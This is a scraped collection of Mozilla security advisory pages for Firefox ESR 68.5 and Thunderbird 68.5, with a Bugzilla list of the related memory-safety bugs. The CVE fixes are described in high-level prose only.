* [712182](https://bugs.gentoo.org/show_bug.cgi?id=712182)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.mozilla.org_726b16e0_20250119_123142.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-06

## Security Vulnerabilities fixed in Firefox ESR 68.5

Announced
February 11, 2020
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 68.5

#### [#CVE-2020-6796: Missing bounds check on shared memory read in the parent process](#CVE-2020-6796)

Reporter
Thomas Imbert
Impact
high
##### Description

A content process could have modified shared memory relating to crash reporting information, crash itself, and cause an out-of-bound write. This could have caused memory corruption and a potentially exploitable crash.

##### References

* [Bug 1610426](https://bugzilla.mozilla.org/show_bug.cgi?id=1610426)

#### [#CVE-2020-6797: Extensions granted downloads.open permission could open arbitrary applications on Mac OSX](#CVE-2020-6797)

Reporter
Vladimir Metnew
Impact
moderate
##### Description

By downloading a file with the .fileloc extension, a semi-privileged extension could launch an arbitrary application on the user's computer. The attacker is restricted as they are unable to download non-quarantined files or supply command line arguments to the application, limiting the impact.
*Note: this issue only occurs on Mac OSX. Other operating systems are unaffected.*

##### References

* [Bug 1596668](https://bugzilla.mozilla.org/show_bug.cgi?id=1596668)

#### [#CVE-2020-6798: Incorrect parsing of template tag could result in JavaScript injection](#CVE-2020-6798)

Reporter
terjanq
Impact
moderate
##### Description

If a `<template>` tag was used in a `<select%gt;` tag, the parser could be confused and allow JavaScript parsing and execution when it should not be allowed. A site that relied on the browser behaving correctly could suffer a cross-site scripting vulnerability as a result.

##### References

* [Bug 1602944](https://bugzilla.mozilla.org/show_bug.cgi?id=1602944)

#### [#CVE-2020-6799: Arbitrary code execution when opening pdf links from other applications, when Firefox is configured as default pdf reader](#CVE-2020-6799)

Reporter
Joshua Graham & Brendan Scarvell
Impact
moderate
##### Description

Command line arguments could have been injected during Firefox invocation as a shell handler for certain unsupported file types. This required Firefox to be configured as the default handler for a given file type and for a file downloaded to be opened in a third party application that insufficiently sanitized URL data. In that situation, clicking a link in the third party application could have been used to retrieve and execute files whose location was supplied through command line arguments.
*Note: This issue only affects Windows operating systems and when Firefox is configured as the default handler for non-default filetypes. Other operating systems are unaffected.*

##### References

* [Bug 1606596](https://bugzilla.mozilla.org/show_bug.cgi?id=1606596)

#### [#CVE-2020-6800: Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](#CVE-2020-6800)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Raul Gurzau, Tyson Smith, Bob Clary, Liz Henry, and Christian Holler reported memory safety bugs present in Firefox 72 and Firefox ESR 68.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_0c6a373f_20250119_123143.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-07

## Security Vulnerabilities fixed in Thunderbird 68.5

Announced
February 11, 2020
Impact
moderate
Products
Thunderbird
Fixed in

* Thunderbird 68.5

#### [#CVE-2020-6793: Out-of-bounds read when processing certain email messages](#CVE-2020-6793)

Reporter
Chiaki ISHIKAWA
Impact
moderate
##### Description

When processing an email message with an ill-formed envelope, Thunderbird could read data from a random memory location.

##### References

* [Bug 1608539](https://bugzilla.mozilla.org/show_bug.cgi?id=1608539)

#### [#CVE-2020-6794: Setting a master password post-Thunderbird 52 does not delete unencrypted previously stored passwords](#CVE-2020-6794)

Reporter
Jurgen Gaeremyn
Impact
moderate
##### Description

If a user saved passwords before Thunderbird 60 and then later set a master password, an unencrypted copy of these passwords is still accessible. This is because the older stored password file was not deleted when the data was copied to a new format starting in Thunderbird 60. The new master password is added only on the new file. This could allow the exposure of stored password data outside of user expectations.

##### References

* [Bug 1606619](https://bugzilla.mozilla.org/show_bug.cgi?id=1606619)

#### [#CVE-2020-6795: Crash processing S/MIME messages with multiple signatures](#CVE-2020-6795)

Reporter
Stephan Lauffer
Impact
moderate
##### Description

When processing a message that contains multiple S/MIME signatures, a bug in the MIME processing code caused a null pointer dereference, leading to an unexploitable crash.

##### References

* [Bug 1611105](https://bugzilla.mozilla.org/show_bug.cgi?id=1611105)

#### [#CVE-2020-6797: Extensions granted downloads.open permission could open arbitrary applications on Mac OSX](#CVE-2020-6797)

Reporter
Vladimir Metnew
Impact
moderate
##### Description

By downloading a file with the .fileloc extension, a semi-privileged extension could launch an arbitrary application on the user's computer. The attacker is restricted as they are unable to download non-quarantined files or supply command line arguments to the application, limiting the impact.
*Note: this issue only occurs on Mac OSX. Other operating systems are unaffected.*

##### References

* [Bug 1596668](https://bugzilla.mozilla.org/show_bug.cgi?id=1596668)

#### [#CVE-2020-6798: Incorrect parsing of template tag could result in JavaScript injection](#CVE-2020-6798)

Reporter
terjanq
Impact
moderate
##### Description

If a `<template>` tag was used in a `<select%gt;` tag, the parser could be confused and allow JavaScript parsing and execution when it should not be allowed. A site that relied on the browser behaving correctly could suffer a cross-site scripting vulnerability as a result.
*In general, this flaw cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but is potentially a risk in browser or browser-like contexts.*

##### References

* [Bug 1602944](https://bugzilla.mozilla.org/show_bug.cgi?id=1602944)

#### [#CVE-2020-6792: Message ID calculcation was based on uninitialized data](#CVE-2020-6792)

Reporter
Chiaki ISHIKAWA
Impact
low
##### Description

When deriving an identifier for an email message, uninitialized memory was used in addition to the message contents.

##### References

* [Bug 1609607](https://bugzilla.mozilla.org/show_bug.cgi?id=1609607)

#### [#CVE-2020-6800: Memory safety bugs fixed in Thunderbird 68.5](#CVE-2020-6800)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Raul Gurzau, Tyson Smith, Bob Clary, Liz Henry, and Christian Holler reported memory safety bugs present in Firefox 72 and Firefox ESR 68.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.
*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

##### References

* [Memory safety bugs fixed in Firefox 73, Firefox ESR 68.5, and Thunderbird 68.5](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_0a956661_20250119_123139.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Sun Jan 19 2025 04:31:39 PST

* **Bug ID:**
  1595786,
  1596706,
  1598543,
  1604851,
  1608580,
  1608785,
  1605777

---

| [ID](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=bug_id%20DESC&query_based_on=) | [Type](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=bug_type%2Cbug_status%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) | [Summary](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=short_desc%2Cbug_status%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) | [Product](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=product%2Cbug_status%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) | [Comp](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=component%2Cbug_status%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) | [Assignee▲](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=assigned_to%20DESC%2Cbug_status%2Cpriority%2Cbug_id&query_based_on=) | [Status▲](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=bug_status%20DESC%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) | [Resolution](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=resolution%2Cbug_status%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) | [Updated](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&order=changeddate%2Cbug_status%2Cpriority%2Cassigned_to%2Cbug_id&query_based_on=) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [1604851](/show_bug.cgi?id=1604851 "RESOLVED FIXED - Assertion failure: IsIdle(oldState), at xpcom/ds/PLDHashTable.h:142 with concurrent hashtable access from [@ mozilla::net::nsHttpHandler::BlacklistSpdy]") |  | [Assertion failure: IsIdle(oldState), at xpcom/ds/PLDHashTable.h:142 with concurrent hashtable access from [@ mozilla::net::nsHttpHandler::BlacklistSpdy]](/show_bug.cgi?id=1604851) | Core | Networking | CuveeHsu | RESO | FIXE | 2020-06-05 |
| [1608785](/show_bug.cgi?id=1608785 "RESOLVED FIXED - Assertion failure: !cx->runtime()->jitRuntime()->disallowArbitraryCode, at vm/Interpreter.cpp:394 with Debugger") |  | [Assertion failure: !cx->runtime()->jitRuntime()->disallowArbitraryCode, at vm/Interpreter.cpp:394 with Debugger](/show_bug.cgi?id=1608785) | Core | JavaScript Engine | jdemooij | RESO | FIXE | 2020-06-05 |
| [1596706](/show_bug.cgi?id=1596706 "RESOLVED FIXED - Assertion failure: chars.length(), at js/src/vm/BigIntType.cpp:1499") |  | [Assertion failure: chars.length(), at js/src/vm/BigIntType.cpp:1499](/show_bug.cgi?id=1596706) | Core | JavaScript Engine | jwalden | RESO | FIXE | 2020-06-10 |
| [1608580](/show_bug.cgi?id=1608580 "RESOLVED DUPLICATE - Crash in [@ mozilla::dom::IDBCursor::Continue]") |  | [Crash in [@ mozilla::dom::IDBCursor::Continue]](/show_bug.cgi?id=1608580) | Core | Storage: IndexedDB | simon.giesecke | RESO | DUPL | 2023-12-02 |
| [1605777](/show_bug.cgi?id=1605777 "RESOLVED FIXED - heap-use-after-free z:\build\build\src\gfx\layers\basic\BasicCompositor.cpp:129 in mozilla::layers::WrappingTextureSourceYCbCrBasic::GetSurface(class mozilla::gfx::DrawTarget *)") |  | [heap-use-after-free z:\build\build\src\gfx\layers\basic\BasicCompositor.cpp:129 in mozilla::layers::WrappingTextureSourceYCbCrBasic::GetSurface(class mozilla::gfx::DrawTarget \*)](/show_bug.cgi?id=1605777) | Core | Graphics: Layers | sotaro.ikeda.g | RESO | FIXE | 2020-06-05 |
| [1598543](/show_bug.cgi?id=1598543 "VERIFIED FIXED - stack-buffer-overflow in [@ mozilla::media::LambdaRunnable]") |  | [stack-buffer-overflow in [@ mozilla::media::LambdaRunnable]](/show_bug.cgi?id=1598543) | Core | WebRTC: Audio/Video | jib | VERI | FIXE | 2020-06-30 |
| [1595786](/show_bug.cgi?id=1595786 "VERIFIED FIXED - AddressSanitizer: heap-use-after-free FetchStreamReader::WriteBuffer / /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpy") |  | [AddressSanitizer: heap-use-after-free FetchStreamReader::WriteBuffer / /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan\_interceptors\_memintrinsics.cc:22:3 in \_\_asan\_memcpy](/show_bug.cgi?id=1595786) | Core | DOM: Networking | amarchesini | VERI | FIXE | 2020-06-05 |

7 bugs found.

|  |  | [REST](/rest/bug?include_fields=id,summary,status&bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777 "Query as a REST API request") | [CSV](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&ctype=csv&human=1) | [Feed](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&title=Bug%20List&ctype=atom) | [iCalendar](/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&ctype=ics)  [Change Columns](/colchange.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced&query_based_on=) | [Edit Search](/query.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777&query_format=advanced) |  | as |
| --- | --- | --- | --- | --- | --- |

[File
a new bug
in the "Core" product](/enter_bug.cgi?product=Core)


